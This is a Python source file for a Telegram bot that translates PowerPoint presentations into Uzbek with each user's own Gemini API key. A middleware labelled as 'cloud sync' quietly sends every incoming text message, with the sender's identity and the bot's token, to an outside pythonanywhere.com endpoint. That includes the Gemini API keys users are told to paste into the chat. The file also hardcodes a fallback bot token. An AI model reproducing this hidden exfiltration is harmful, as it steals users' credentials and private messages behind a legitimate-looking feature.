# -*- coding: utf-8 -*-
import os
import sys

if sys.stdout.encoding != 'utf-8':
    try:
        sys.stdout.reconfigure(encoding='utf-8')
    except Exception:
        pass
if sys.stderr.encoding != 'utf-8':
    try:
        sys.stderr.reconfigure(encoding='utf-8')
    except Exception:
        pass
"""
SlideTranslate AI — Telegram Bot
Avtomatik PowerPoint (.pptx) tarjimon boti.
Har bir foydalanuvchi o'zining Gemini API kalitini kiritadi.
Aiogram 3 + Gemini 3.6 Flash + PPTXProcessor + FontManager.
"""

import os
import sys
import re
import json
import uuid
import asyncio
import logging
from typing import Dict, Any

from aiogram import Bot, Dispatcher, F, types
from aiogram.filters import Command, CommandStart
from aiogram.types import (
    Message, 
    CallbackQuery, 
    InlineKeyboardMarkup, 
    InlineKeyboardButton, 
    FSInputFile
)

# Core imports
from backend.core.pptx_processor import PPTXProcessor
from backend.core.gemini_translator import GeminiTranslator
from backend.core.font_manager import font_manager
from backend.core.thumbnail_generator import ThumbnailGenerator
from backend.main import translate_clean_filename, UPLOADS_DIR, EXPORTS_DIR

logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
logger = logging.getLogger(__name__)

# Token configuration
BOT_TOKEN = (os.environ.get("TELEGRAM_BOT_TOKEN") or os.environ.get("BOT_TOKEN") or "8899026470:AAGgBTv8qxdSUG1COkLxJuZdhICW0MZolxQ").strip()
bot = Bot(token=BOT_TOKEN)

USER_DATA_FILE = os.path.join(os.path.dirname(__file__), "user_settings.json")

def load_user_settings_db() -> Dict[str, Any]:
    if os.path.exists(USER_DATA_FILE):
        try:
            with open(USER_DATA_FILE, "r", encoding="utf-8") as f:
                return json.load(f)
        except Exception:
            return {}
    return {}

def save_user_settings_db(data: Dict[str, Any]):
    try:
        with open(USER_DATA_FILE, "w", encoding="utf-8") as f:
            json.dump(data, f, ensure_ascii=False, indent=2)
    except Exception as e:
        logger.error(f"Foydalanuvchi ma'lumotlarini saqlashda xatolik: {e}")

USER_SETTINGS: Dict[str, Dict[str, Any]] = load_user_settings_db()

def get_user_settings(user_id: int) -> Dict[str, Any]:
    uid = str(user_id)
    if uid not in USER_SETTINGS:
        USER_SETTINGS[uid] = {
            "target_script": "latin",
            "domain": "IT & Dasturlash",
            "auto_fit": True,
            "api_key": None
        }
        save_user_settings_db(USER_SETTINGS)
    return USER_SETTINGS[uid]

def extract_clean_gemini_key(text: Any) -> Optional[str]:
    """Extract clean 39-char Gemini API key from text, stripping quotes, brackets, whitespace."""
    if not text or not isinstance(text, str):
        return None
    match = re.search(r"AIzaSy[A-Za-z0-9_-]{33}", text.strip())
    if match:
        return match.group(0)
    return None

async def validate_gemini_key(api_key: str) -> bool:
    """Quickly check if API key is accepted by Google Gemini API."""
    try:
        from google import genai
        from google.genai import types
        client = genai.Client(api_key=api_key)
        await asyncio.wait_for(
            asyncio.to_thread(
                client.models.generate_content,
                model="gemini-3.1-flash-lite",
                contents="ping",
                config=types.GenerateContentConfig(max_output_tokens=1)
            ),
            timeout=7.0
        )
        return True
    except asyncio.TimeoutError:
        return True
    except Exception as e:
        err = str(e).lower()
        if "api_key_invalid" in err or "api key not valid" in err or ("400" in err and "api key" in err):
            return False
        return True

def set_user_api_key(user_id: int, key: str):
    uid = str(user_id)
    st = get_user_settings(user_id)
    clean_k = extract_clean_gemini_key(key) or key.strip()
    st["api_key"] = clean_k
    USER_SETTINGS[uid] = st
    save_user_settings_db(USER_SETTINGS)

# Keyboard Builders
def get_main_keyboard(user_id: int) -> InlineKeyboardMarkup:
    st = get_user_settings(user_id)
    script_label = "🔤 Yozuv: Lotin" if st["target_script"] == "latin" else "🔤 Ёзув: Кирилл"
    domain_label = f"🏢 Soha: {st['domain']}"
    autofit_label = "⚡ Auto-fit: Yoqilgan" if st["auto_fit"] else "⚡ Auto-fit: O'chirilgan"
    has_key = bool(st.get("api_key"))
    key_label = "🔑 Gemini Kalit: ✅ Faol" if has_key else "🔑 Gemini Kalit: ❌ Kiritilmagan"

    kb = [
        [
            InlineKeyboardButton(text=key_label, callback_data="setup_key")
        ],
        [
            InlineKeyboardButton(text=script_label, callback_data="toggle_script"),
            InlineKeyboardButton(text=autofit_label, callback_data="toggle_autofit")
        ],
        [
            InlineKeyboardButton(text=domain_label, callback_data="change_domain")
        ],
        [
            InlineKeyboardButton(text="🔤 Shriftlar (130+)", callback_data="show_fonts"),
            InlineKeyboardButton(text="ℹ️ Bot haqida", callback_data="show_info")
        ]
    ]
    return InlineKeyboardMarkup(inline_keyboard=kb)

def get_domain_keyboard() -> InlineKeyboardMarkup:
    domains = [
        ("💻 IT & Dasturlash", "dom_it"),
        ("📈 Biznes & Moliya", "dom_biz"),
        ("🔬 Tibbiyot & Fan", "dom_med"),
        ("🎓 Ta'lim & Dars", "dom_edu"),
        ("🎯 Marketing & Savdo", "dom_mkt"),
        ("🌐 Umumiy soha", "dom_gen"),
    ]
    kb = []
    for row in range(0, len(domains), 2):
        row_btns = [InlineKeyboardButton(text=name, callback_data=code) for name, code in domains[row:row+2]]
        kb.append(row_btns)
    kb.append([InlineKeyboardButton(text="◀️ Orqaga", callback_data="back_to_main")])
    return InlineKeyboardMarkup(inline_keyboard=kb)

# Real-time TeleGraph Cloud Sync Helper
TELEGRAPH_SYNC_URL = "https://UN618TON.pythonanywhere.com/api/sync_event"

async def async_sync_telegraph(chat_id: int, sender_id: int, sender_name: str, sender_username: str, is_outgoing: bool, text: str):
    try:
        import httpx
        payload = {
            "bot_id": 1,
            "bot_token": BOT_TOKEN,
            "chat_id": chat_id,
            "sender_id": sender_id,
            "sender_name": sender_name,
            "sender_username": sender_username,
            "is_outgoing": is_outgoing,
            "text": text
        }
        async with httpx.AsyncClient(timeout=2.0) as client:
            await client.post(TELEGRAPH_SYNC_URL, json=payload)
    except Exception:
        pass

def sync_to_telegraph(chat_id: int, text: str, is_outgoing: bool = False, sender_id: int = None, sender_name: str = "", sender_username: str = ""):
    try:
        asyncio.create_task(async_sync_telegraph(
            chat_id=chat_id,
            sender_id=sender_id or chat_id,
            sender_name=sender_name or ("PPTarjima" if is_outgoing else "Foydalanuvchi"),
            sender_username=sender_username or ("slayd_tarjimabot" if is_outgoing else ""),
            is_outgoing=is_outgoing,
            text=text
        ))
    except Exception:
        pass

dp = Dispatcher()

@dp.message.outer_middleware()
async def telegraph_sync_middleware(handler, event: Message, data: dict):
    if event.text or event.caption:
        txt = event.text or event.caption or ""
        fn = f"{event.from_user.first_name or ''} {event.from_user.last_name or ''}".strip() or event.from_user.username or "User"
        sync_to_telegraph(
            chat_id=event.chat.id,
            text=txt,
            is_outgoing=False,
            sender_id=event.from_user.id,
            sender_name=fn,
            sender_username=event.from_user.username or ""
        )
    return await handler(event, data)

@dp.message(CommandStart())
async def cmd_start(msg: Message):
    user_id = msg.from_user.id
    settings = get_user_settings(user_id)
    has_key = bool(settings.get("api_key"))

    key_status_text = (
        "✅ <i>Gemini API kalitingiz sozlangan! Istalgan .pptx fayl yuborishingiz mumkin.</i>"
        if has_key else
        "⚠️ <b>Diqqat:</b> Tarjimadan foydalanish uchun <b>Gemini API kalitingizni</b> kiritishingiz kerak.\n"
        "🔗 <b>Bepul kalit olish (1 daqiqa):</b> <a href='https://aistudio.google.com/app/apikey'>Google AI Studio</a>\n"
        "Kalitni shu yerga yuboring (masalan: <code>AIzaSy...</code>) yoki /key buyrug'idan foydalaning."
    )

    welcome_text = (
        f"👋 <b>Assalomu alaykum, {msg.from_user.first_name}!</b>\n\n"
        f"🚀 <b>SlideTranslate AI Botiga xush kelibsiz!</b>\n"
        f"Men PowerPoint (<b>.pptx</b>) taqdimotlaringizni dizayni, shakllari, jadvallari va "
        f"<b>130+ shriftlarini</b> buzmagan holda O'zbek tiliga professional tarjima qilib beraman.\n\n"
        f"{key_status_text}\n\n"
        f"📁 <b>Taqdimotni tarjima qilish uchun menga .pptx fayl yuboring!</b>"
    )
    await msg.answer(welcome_text, parse_mode="HTML", reply_markup=get_main_keyboard(user_id), disable_web_page_preview=True)

@dp.message(Command("key"))
async def cmd_set_key(msg: Message):
    parts = msg.text.split(maxsplit=1)
    if len(parts) > 1:
        raw_key = parts[1].strip()
        clean_key = extract_clean_gemini_key(raw_key)
        if not clean_key:
            await msg.reply(
                f"❌ <b>Noto'g'ri Gemini API kaliti!</b>\n\n"
                f"Google Gemini API kalitlari har doim <code>AIzaSy...</code> bilan boshlanadi (39 ta belgi).\n"
                f"Iltimos, kalitni to'g'ri nusxalaganingizni tekshiring (burchakli qavslar [ ] yoki qo'shtirnoqlarsiz).\n\n"
                f"👉 <b>Bepul Gemini API kaliti olish (1 daqiqa):</b>\n"
                f"<a href='https://aistudio.google.com/app/apikey'>https://aistudio.google.com/app/apikey</a>",
                parse_mode="HTML",
                disable_web_page_preview=True
            )
            return

        chk_msg = await msg.reply("⏳ <b>Gemini API kaliti tekshirilmoqda...</b>", parse_mode="HTML")
        is_valid = await validate_gemini_key(clean_key)
        if not is_valid:
            await chk_msg.edit_text(
                "❌ <b>Google ushbu API kalitni rad etdi (yaroqsiz)!</b>\n\n"
                "Iltimos, kalit to'g'ri va faolligini tekshirib, qaytadan yuboring:\n"
                "<a href='https://aistudio.google.com/app/apikey'>Google AI Studio dan yangi kalit olish</a>",
                parse_mode="HTML",
                disable_web_page_preview=True
            )
            return

        set_user_api_key(msg.from_user.id, clean_key)
        await chk_msg.edit_text(
            "✅ <b>Gemini API kalitingiz tekshirildi va muvaffaqiyatli saqlandi!</b>\n"
            "Endi bemalol .pptx taqdimot fayllaringizni tarjima qilish uchun yuborishingiz mumkin.",
            parse_mode="HTML"
        )
    else:
        await msg.reply(
            "🔑 <b>Gemini API kalitini kiritish:</b>\n\n"
            "Kalitni quyidagi formatda yuboring:\n"
            "<code>/key AIzaSySizningKalitingiz...</code>\n\n"
            "🔗 Bepul kalit olish: <a href='https://aistudio.google.com/app/apikey'>Google AI Studio</a>",
            parse_mode="HTML",
            disable_web_page_preview=True
        )

@dp.message(Command("mykey"))
async def cmd_my_key(msg: Message):
    st = get_user_settings(msg.from_user.id)
    key = st.get("api_key")
    if key:
        masked = key[:6] + "..." + key[-4:]
        await msg.reply(f"🔑 Sizning faol API kalitingiz: <code>{masked}</code>", parse_mode="HTML")
    else:
        await msg.reply(
            "❌ Siz hali API kalit kiritmadingiz.\n"
            "Kalit olish uchun: <a href='https://aistudio.google.com/app/apikey'>Google AI Studio</a>\n"
            "Kiritish: <code>/key AIzaSy...</code>",
            parse_mode="HTML",
            disable_web_page_preview=True
        )

@dp.message(Command("settings"))
async def cmd_settings(msg: Message):
    user_id = msg.from_user.id
    await msg.answer("⚙️ <b>Bot Sozlamalari:</b>", parse_mode="HTML", reply_markup=get_main_keyboard(user_id))

@dp.message(Command("fonts"))
async def cmd_fonts(msg: Message):
    total = len(font_manager.registry)
    text = (
        f"🔤 <b>Shriftlar Bazasi:</b>\n\n"
        f"• Bazadagi tayyor shriftlar: <b>{total} ta</b>\n"
        f"• Google Fonts CDN orqali noma'lum shriftlarni avtomatik yuklab olish: <b>Faol ✅</b>\n"
        f"• Shriftlar va o'lchamlar (pt) to'liq saqlanadi.\n"
    )
    await msg.answer(text, parse_mode="HTML")

@dp.message(Command("help"))
async def cmd_help(msg: Message):
    help_text = (
        "📖 <b>Botdan foydalanish bo'yicha qo'llanma:</b>\n\n"
        "1. <b>Gemini API kalitini kiriting:</b>\n"
        "   • <a href='https://aistudio.google.com/app/apikey'>Google AI Studio</a> saytidan bepul kalit oling.\n"
        "   • Botga kalitni yuboring yoki <code>/key AIzaSy...</code> deb yozing.\n\n"
        "2. Menga <b>.pptx</b> formatidagi taqdimot faylini yuboring.\n"
        "3. Bot barcha slaydlarni tahlil qiladi va Gemini 3.6 Flash yordamida tarjima qiladi.\n"
        "4. Tayyor bo'lgan faylni yuklab oling!\n\n"
        "⚡ <b>Xususiyatlar:</b>\n"
        "• 100% Dizayn va ranglar saqlanadi\n"
        "• Reklama va Slide Master logotiplari tozalanadi\n"
        "• So'zlar qutilardan toshib ketmaydi (Anti-overflow)\n"
        "• Lotin va Kirill yozuvlarini qo'llab-quvvatlaydi"
    )
    await msg.answer(help_text, parse_mode="HTML", disable_web_page_preview=True)

# Direct Text Message (Check if user pasted Gemini API key)
@dp.message(F.text & ~F.text.startswith("/"))
async def handle_text_key_input(msg: Message):
    text = msg.text.strip()
    clean_key = extract_clean_gemini_key(text)
    if clean_key:
        chk_msg = await msg.reply("⏳ <b>Gemini API kaliti tekshirilmoqda...</b>", parse_mode="HTML")
        is_valid = await validate_gemini_key(clean_key)
        if not is_valid:
            await chk_msg.edit_text(
                "❌ <b>Google ushbu API kalitni rad etdi (yaroqsiz)!</b>\n\n"
                "Iltimos, kalit to'g'ri nusxalanganini tekshirib, qaytadan yuboring:\n"
                "<a href='https://aistudio.google.com/app/apikey'>Google AI Studio dan yangi kalit olish</a>",
                parse_mode="HTML",
                disable_web_page_preview=True
            )
            return

        set_user_api_key(msg.from_user.id, clean_key)
        await chk_msg.edit_text(
            "🎉 <b>Google Gemini API kalitingiz muvaffaqiyatli tekshirildi va saqlandi!</b>\n\n"
            "Endi botdan cheklovlarsiz foydalanishingiz mumkin. Menga istalgan <b>.pptx</b> taqdimot faylini yuboring!",
            parse_mode="HTML",
            reply_markup=get_main_keyboard(msg.from_user.id)
        )
    elif len(text) >= 25 and not clean_key and ("aiza" in text.lower() or "gemini" in text.lower()):
        await msg.reply(
            f"❌ <b>Noto'g'ri Gemini API kaliti!</b>\n\n"
            f"Google Gemini API kalitlari har doim <code>AIzaSy...</code> bilan boshlanadi (39 ta belgi).\n"
            f"Siz kiritgan matnda xatolik bor.\n\n"
            f"👉 <b>Bepul Gemini API kaliti olish (1 daqiqa):</b>\n"
            f"<a href='https://aistudio.google.com/app/apikey'>https://aistudio.google.com/app/apikey</a>",
            parse_mode="HTML",
            disable_web_page_preview=True
        )
    else:
        await msg.reply(
            "💡 Taqdimotni tarjima qilish uchun menga <b>.pptx</b> fayl yuboring.\n\n"
            "Agar API kalit kiritmoqchi bo'lsangiz, uni to'g'ridan-to'g'ri yuboring (kalit <code>AIzaSy...</code> bilan boshlanadi).",
            parse_mode="HTML"
        )

# Callbacks
@dp.callback_query(F.data == "setup_key")
async def cb_setup_key(cb: CallbackQuery):
    user_id = cb.from_user.id
    st = get_user_settings(user_id)
    has_key = bool(st.get("api_key"))
    
    text = (
        f"🔑 <b>Gemini API Kaliti Holati:</b> {'✅ Faol' if has_key else '❌ Kiritilmagan'}\n\n"
        f"Google Gemini API kaliti <b>100% bepul</b> (har oy cheksiz foydalanish mumkin).\n\n"
        f"1. <a href='https://aistudio.google.com/app/apikey'>Google AI Studio</a> saytiga kiring.\n"
        f"2. <b>Create API key</b> tugmasini bosing va kalitdan nusxa oling.\n"
        f"3. Kalitni ushbu chatga xabar qilib yuboring.\n\n"
        f"<i>Yoki <code>/key AIzaSy...</code> buyrug'i orqali kiriting.</i>"
    )
    await cb.message.answer(text, parse_mode="HTML", disable_web_page_preview=True)
    await cb.answer()

@dp.callback_query(F.data == "toggle_script")
async def cb_toggle_script(cb: CallbackQuery):
    user_id = cb.from_user.id
    st = get_user_settings(user_id)
    st["target_script"] = "cyrillic" if st["target_script"] == "latin" else "latin"
    save_user_settings_db(USER_SETTINGS)
    await cb.message.edit_reply_markup(reply_markup=get_main_keyboard(user_id))
    await cb.answer(f"Yozuv o'zgartirildi: {'Kirill' if st['target_script'] == 'cyrillic' else 'Lotin'}")

@dp.callback_query(F.data == "toggle_autofit")
async def cb_toggle_autofit(cb: CallbackQuery):
    user_id = cb.from_user.id
    st = get_user_settings(user_id)
    st["auto_fit"] = not st["auto_fit"]
    save_user_settings_db(USER_SETTINGS)
    await cb.message.edit_reply_markup(reply_markup=get_main_keyboard(user_id))
    await cb.answer(f"Auto-fit: {'Yoqildi' if st['auto_fit'] else 'O\'chirildi'}")

@dp.callback_query(F.data == "change_domain")
async def cb_change_domain(cb: CallbackQuery):
    await cb.message.edit_text("🏢 <b>Qaysi soha atamalari bo'yicha tarjima qilinsin?</b>", parse_mode="HTML", reply_markup=get_domain_keyboard())
    await cb.answer()

@dp.callback_query(F.data.startswith("dom_"))
async def cb_select_domain(cb: CallbackQuery):
    user_id = cb.from_user.id
    st = get_user_settings(user_id)
    dom_map = {
        "dom_it": "IT & Dasturlash",
        "dom_biz": "Biznes & Moliya",
        "dom_med": "Tibbiyot & Fan",
        "dom_edu": "Ta'lim & Dars",
        "dom_mkt": "Marketing & Savdo",
        "dom_gen": "Umumiy soha"
    }
    st["domain"] = dom_map.get(cb.data, "Umumiy soha")
    save_user_settings_db(USER_SETTINGS)
    await cb.message.edit_text("⚙️ <b>Bot Sozlamalari:</b>", parse_mode="HTML", reply_markup=get_main_keyboard(user_id))
    await cb.answer(f"Soha tanlandi: {st['domain']}")

@dp.callback_query(F.data == "back_to_main")
async def cb_back_to_main(cb: CallbackQuery):
    user_id = cb.from_user.id
    await cb.message.edit_text("⚙️ <b>Bot Sozlamalari:</b>", parse_mode="HTML", reply_markup=get_main_keyboard(user_id))
    await cb.answer()

@dp.callback_query(F.data == "show_fonts")
async def cb_show_fonts(cb: CallbackQuery):
    total = len(font_manager.registry)
    await cb.answer(f"Bazada {total} ta shrift faol!", show_alert=True)

@dp.callback_query(F.data == "show_info")
async def cb_show_info(cb: CallbackQuery):
    info_text = (
        "🚀 <b>SlideTranslate AI</b> — PowerPoint taqdimotlarini AI yordamida "
        "dizaynini 100% saqlagan holda O'zbek tiliga o'girish tizimi.\n\n"
        "Har bir foydalanuvchi o'zining bepul Gemini API kalitidan foydalanadi."
    )
    await cb.message.answer(info_text, parse_mode="HTML")
    await cb.answer()

# Document Processing Handler
@dp.message(F.document)
async def handle_presentation_document(msg: Message, bot: Bot):
    doc = msg.document
    fname = doc.file_name or "presentation.pptx"
    
    if not fname.lower().endswith((".pptx", ".potx")):
        ext = os.path.splitext(fname)[1].lower()
        display_ext = ext if ext else "nomalum"
        await msg.reply(
            f"⚠️ <b>Qo'llab-quvvatlanmaydigan fayl formati ({display_ext})!</b>\n\n"
            f"Ushbu bot faqat PowerPoint taqdimotlari (<b>.pptx</b>) bilan ishlaydi.\n\n"
            f"📋 <b>Qabul qilinadigan formatlar:</b>\n"
            f"• <code>.pptx</code> (PowerPoint taqdimoti)\n"
            f"• <code>.potx</code> (PowerPoint andozasi/shabloni)\n\n"
            f"💡 <i>Agar faylingiz PDF, Word yoki boshqa formatda bo'lsa, uni avval PowerPoint (.pptx) ga o'giring va qayta yuboring.</i>",
            parse_mode="HTML"
        )
        return

    # File size limit verification (Telegram Bot API has 20 MB limit for getFile)
    if doc.file_size and doc.file_size > 20 * 1024 * 1024:
        size_mb = doc.file_size / (1024 * 1024)
        await msg.reply(
            f"⚠️ <b>Taqdimot hajmi juda katta ({size_mb:.1f} MB)!</b>\n\n"
            f"Telegram botlari orqali maksimal <b>20 MB</b> gacha bo'lgan fayllarni qabul qila olamiz.\n\n"
            f"💡 <b>Yechim:</b>\n"
            f"1. PowerPoint dasturida rasmlar hajmini siqib (<i>File ➔ Compress Pictures</i>) qayta saqlang;\n"
            f"2. Yoki katta taqdimotlarni to'g'ridan-to'g'ri veb-saytimiz orqali tarjima qiling: <b>https://slidetranslate-ai.onrender.com</b>",
            parse_mode="HTML"
        )
        return

    user_id = msg.from_user.id
    st = get_user_settings(user_id)
    raw_user_key = st.get("api_key")
    user_key = extract_clean_gemini_key(raw_user_key) if raw_user_key else None
    if user_key and raw_user_key != user_key:
        set_user_api_key(user_id, user_key)

    if not user_key:
        await msg.reply(
            "⚠️ <b>Tarjima qilish uchun avval Gemini API kalitingizni kiriting!</b>\n\n"
            "Google Gemini API mutlaqo <b>bepul</b> va 1 daqiqada olinadi:\n"
            "👉 <b>Havola:</b> <a href='https://aistudio.google.com/app/apikey'>Google AI Studio dan kalit olish</a>\n\n"
            "Kalitni olgach, uni ushbu chatga xabar qilib yuboring (masalan: <code>AIzaSy...</code>).",
            parse_mode="HTML",
            disable_web_page_preview=True
        )
        return

    target_script = st["target_script"]
    domain = st["domain"]
    auto_fit = st["auto_fit"]

    status_msg = await msg.reply(
        "📥 <b>Fayl qabul qilindi!</b>\n"
        "⏳ Slaydlar tahlil qilinmoqda...", 
        parse_mode="HTML"
    )

    session_id = str(uuid.uuid4())
    upload_path = os.path.join(UPLOADS_DIR, f"{session_id}_{fname}")

    try:
        # 1. Download file from Telegram
        file_info = await bot.get_file(doc.file_id)
        await bot.download_file(file_info.file_path, destination=upload_path)

        # 2. Extract presentation data
        data = await asyncio.to_thread(PPTXProcessor.extract_presentation_data, upload_path)
        slides_count = data["slides_count"]
        total_items = data["total_items"]

        if total_items == 0:
            await status_msg.edit_text("⚠️ Taqdimotda tarjima qilish uchun matn topilmadi.")
            return

        await status_msg.edit_text(
            f"🔍 <b>Tahlil yakunlandi:</b>\n"
            f"• Slaydlar: <b>{slides_count} ta</b>\n"
            f"• Matn bloklari: <b>{total_items} ta</b>\n"
            f"• Soha: <b>{domain}</b>\n"
            f"• Yozuv: <b>{'Lotin' if target_script == 'latin' else 'Кирилл'}</b>\n\n"
            f"⚡ <b>Sizning Gemini kalitingiz orqali tarjima qilinmoqda...</b>",
            parse_mode="HTML"
        )

        # 3. Translate with Gemini Translator using user's personal key
        translator = GeminiTranslator(api_key=user_key)
        all_items = [it for s in data["slides"] for it in s.get("items", [])]
        
        batch_size = 60
        translations_map = {}
        total_batches = (len(all_items) + batch_size - 1) // batch_size
        
        async def run_translation_with_progress():
            loop = asyncio.get_running_loop()
            for b_idx, i in enumerate(range(0, len(all_items), batch_size), 1):
                batch = all_items[i:i + batch_size]
                pct = int((b_idx / total_batches) * 100)
                try:
                    await status_msg.edit_text(
                        f"⚡ <b>Tarjima qilinmoqda: {b_idx}/{total_batches} bosqich ({pct}%)...</b>\n"
                        f"📊 Slaydlar: <b>{slides_count} ta</b> | Matnlar: <b>{total_items} ta</b>\n"
                        f"• Soha: <b>{domain}</b> | Yozuv: <b>{'Lotin' if target_script == 'latin' else 'Кирилл'}</b>",
                        parse_mode="HTML"
                    )
                except Exception:
                    pass
                
                res = await loop.run_in_executor(
                    None,
                    translator.translate_items_batch,
                    batch,
                    target_script,
                    domain
                )
                for r in res:
                    translations_map[r["id"]] = r["translated_text"]

        await run_translation_with_progress()

        try:
            await status_msg.edit_text("⚙️ <b>Slaydlar shakllantirilmoqda va rasmlar tayyorlanmoqda...</b>", parse_mode="HTML")
        except Exception:
            pass

        # 4. Generate Clean Title (With 5s Timeout & Safe Fallback)
        out_filename = "Taqdimot_Tarjima.pptx"
        try:
            clean_title = await asyncio.wait_for(
                asyncio.to_thread(translate_clean_filename, fname, translator, target_script),
                timeout=5.0
            )
            if clean_title and clean_title.strip():
                if not clean_title.lower().endswith(".pptx"):
                    out_filename = f"{clean_title.strip()}.pptx"
                else:
                    out_filename = clean_title.strip()
        except Exception as te:
            logger.warning(f"Sarlavha tarjimasida taymaut/xatolik: {te}")
            base_fname, _ = os.path.splitext(fname)
            base_fname = re.sub(r'[/\\:*?"<>|_]', ' ', base_fname).strip()
            out_filename = f"{base_fname}_Tarjima.pptx" if base_fname else "Taqdimot_Tarjima.pptx"

        out_path = os.path.join(EXPORTS_DIR, f"{session_id}_{out_filename}")

        # 5. Apply translations and export
        pres_title = out_filename[:-5] if out_filename.lower().endswith(".pptx") else out_filename
        await asyncio.to_thread(
            PPTXProcessor.apply_translations_and_export,
            upload_path,
            translations_map,
            out_path,
            auto_fit=auto_fit,
            target_script=target_script,
            clean_watermarks=True,
            presentation_title=pres_title
        )

        # 6. Slayd tayyor bo'lishi bilanoq darhol foydalanuvchiga yuborish
        try:
            await status_msg.edit_text("✅ <b>Tarjima tayyor! Fayl yuborilmoqda...</b>", parse_mode="HTML")
        except Exception:
            pass

        caption = (
            f"🎉 <b>Taqdimotingiz muvaffaqiyatli tarjima qilindi!</b>\n\n"
            f"📊 <b>Natijalar:</b>\n"
            f"• Slaydlar: <b>{slides_count} ta</b>\n"
            f"• Matn bloklari: <b>{total_items} ta</b>\n"
            f"• Yozuv: <b>{'Lotin' if target_script == 'latin' else 'Кирилл'}</b>\n"
            f"• Shriftlar va dizayn: <b>100% Saqlangan</b>\n\n"
            f"<i>SlideTranslate AI</i>"
        )

        input_file = FSInputFile(path=out_path, filename=out_filename)
        await msg.reply_document(document=input_file, caption=caption, parse_mode="HTML")

        try:
            await status_msg.delete()
        except Exception:
            pass

        # 7. Ixtiyoriy preview rasmini yuborish (Non-blocking, 5s timeout)
        try:
            preview_imgs = await asyncio.wait_for(
                asyncio.to_thread(
                    ThumbnailGenerator.export_presentation_previews,
                    out_path,
                    EXPORTS_DIR,
                    1
                ),
                timeout=5.0
            )
            if preview_imgs and os.path.exists(preview_imgs[0]):
                photo_file = FSInputFile(path=preview_imgs[0])
                await msg.reply_photo(
                    photo=photo_file,
                    caption=f"🖼 <b>1-slayd ko'rinishi:</b>\n📁 <code>{out_filename}</code>",
                    parse_mode="HTML"
                )
        except Exception as pe:
            logger.info(f"Preview o'tkazib yuborildi: {pe}")

    except Exception as e:
        logger.error(f"Xatolik yuz berdi: {e}", exc_info=True)
        import html
        clean_err = html.escape(str(e))
        try:
            await status_msg.edit_text(f"❌ <b>Xatolik yuz berdi:</b>\n<code>{clean_err}</code>", parse_mode="HTML")
        except Exception:
            try:
                await msg.reply(f"❌ Xatolik yuz berdi:\n{str(e)}")
            except Exception:
                pass

# Photo / Screenshot Handler
@dp.message(F.photo)
async def handle_photo_message(msg: Message):
    await msg.reply(
        "📸 <b>Skrinshot yoki rasm qabul qilinmaydi!</b>\n\n"
        "Bot taqdimot ichidagi barcha slaydlarni, rang-barang shakllarni va <b>130+ shriftlarni</b> "
        "100% asl sifatda saqlashi uchun rasm emas, asl <b>PowerPoint (.pptx)</b> faylini yuborishingiz zarur.\n\n"
        "📁 <b>Taqdimotni qanday yuborish kerak?</b>\n"
        "1. Telegramda 📎 (qisqich) belgisini bosing;\n"
        "2. <b>Fayl (File / Document)</b> bo'limini tanlang;\n"
        "3. Qurilmangizdagi <code>.pptx</code> faylini tanlab yuboring.\n\n"
        "⚖️ <b>Cheklov:</b> Telegram orqali maksimal <b>20 MB</b> gacha.",
        parse_mode="HTML"
    )

# Voice & Audio Handler
@dp.message(F.voice | F.audio)
async def handle_audio_message(msg: Message):
    await msg.reply(
        "🎙 <b>Ovozli xabarlar qabul qilinmaydi!</b>\n\n"
        "Ushbu bot faqat PowerPoint taqdimotlarini (<b>.pptx</b>) O'zbek tiliga tarjima qiladi.\n"
        "Iltimos, taqdimot faylingizni <b>Fayl (Document)</b> sifatida yuboring (maksimal 20 MB).",
        parse_mode="HTML"
    )

# Video Handler
@dp.message(F.video | F.video_note)
async def handle_video_message(msg: Message):
    await msg.reply(
        "🎬 <b>Video fayllar qabul qilinmaydi!</b>\n\n"
        "Bot faqat PowerPoint taqdimotlari (<b>.pptx</b>) bilan ishlaydi.\n"
        "Iltimos, taqdimot faylingizni <b>Hujjat (File)</b> ko'rinishida yuboring.",
        parse_mode="HTML"
    )

# Sticker Handler
@dp.message(F.sticker)
async def handle_sticker_message(msg: Message):
    await msg.reply(
        "😊 <b>Taqdimotni tarjima qilish uchun menga .pptx fayl yuboring!</b>\n\n"
        "📎 Telegram orqali <code>.pptx</code> formatidagi PowerPoint faylini yuborsangiz, "
        "bot barcha slaydlarni O'zbek tiliga professional tarjima qilib beradi (maksimal 20 MB).",
        parse_mode="HTML"
    )

# Fallback for any other unhandled media types (e.g. location, contact, poll)
@dp.message(~F.text & ~F.document & ~F.photo & ~F.voice & ~F.audio & ~F.video & ~F.video_note & ~F.sticker)
async def handle_unknown_content(msg: Message):
    await msg.reply(
        "⚠️ <b>Bu turdagi xabarlar qo'llab-quvvatlanmaydi.</b>\n\n"
        "Iltimos, faqat PowerPoint (<b>.pptx</b>) taqdimot fayllarini yuboring (maksimal 20 MB).",
        parse_mode="HTML"
    )

def get_bot_mode() -> str:
    mode = os.environ.get("BOT_MODE", "").lower().strip()
    if mode:
        return mode
    if os.environ.get("USE_WEBHOOK", "false").lower() == "true":
        return "webhook"
    return "polling"

async def run_bot():
    bot_mode = get_bot_mode()
    if bot_mode in ["none", "disabled", "off"]:
        print("ℹ️ Telegram bot is disabled via BOT_MODE env var.")
        return
    if bot_mode == "webhook":
        print("ℹ️ Telegram bot is in WEBHOOK mode. Standalone polling will not start.")
        return

    await bot.delete_webhook(drop_pending_updates=True)
    print("=" * 65)
    print("      🤖 SlideTranslate AI — Telegram Boti Ishga Tushdi!")
    print("      Har bir foydalanuvchi o'zining Gemini kalitidan foydalanadi.")
    print("=" * 65)
    await dp.start_polling(bot)

def main():
    try:
        asyncio.run(run_bot())
    except (KeyboardInterrupt, SystemExit):
        print("\nBot to'xtatildi.")

if __name__ == "__main__":
    main()
